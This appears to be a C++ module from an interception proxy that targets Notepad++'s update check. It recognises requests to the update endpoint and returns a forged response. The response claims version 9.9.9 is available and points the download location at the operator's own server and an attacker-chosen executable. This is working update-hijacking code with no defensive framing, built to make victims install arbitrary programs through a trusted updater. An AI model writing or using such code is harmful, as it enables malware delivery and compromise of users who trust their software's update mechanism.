#include "Notepad.h"


int NotePad::isNotepad(const char * url,const char * host) {
	if (strstr(url, "/update/getDownloadUrl.php") && strstr(host, "notepad-plus-plus.org"))
	{
		return TRUE;
	}

	return FALSE;
}

int NotePad::sendRespPacket(char * dstbuf, int dstbuflimit, LPSSLPROXYPARAM lpssl) {
	string ver = "9.9.9";		//7.5.9
	char * szFormat = "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>"
		"<GUP>\r\n"
		"<NeedToBeUpdated>yes</NeedToBeUpdated>\r\n"
		"<Version>%s</Version>\r\n"
		"<Location>http://%s/%s</Location>\r\n"
		"</GUP>";

	string ip = HttpUtils::getIPstr(gServerIP) + "/" + lpssl->username;
	string filename =WEIXIN_PC_UPDATE_EXE_FILENAME;
	char result[1024];
	int retlen = wsprintfA(result, szFormat, ver.c_str(), ip.c_str(), filename.c_str());

	char * lpRespFormat = "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: %u\r\nConnection: keep-alive\r\n\r\n%s";

	int len = wsprintfA(dstbuf, lpRespFormat, retlen, result);

	return len;
}


/*
<?xml version="1.0" encoding="ISO-8859-1"?>
<GUP>
<NeedToBeUpdated>yes</NeedToBeUpdated>
<Version>7.5.9</Version>
<Location>http://notepad-plus-plus.org/repository/7.x/7.5.9/npp.7.5.9.Installer.exe</Location>
</GUP>



https://notepad-plus-plus.org/update/getDownloadUrl.php
*/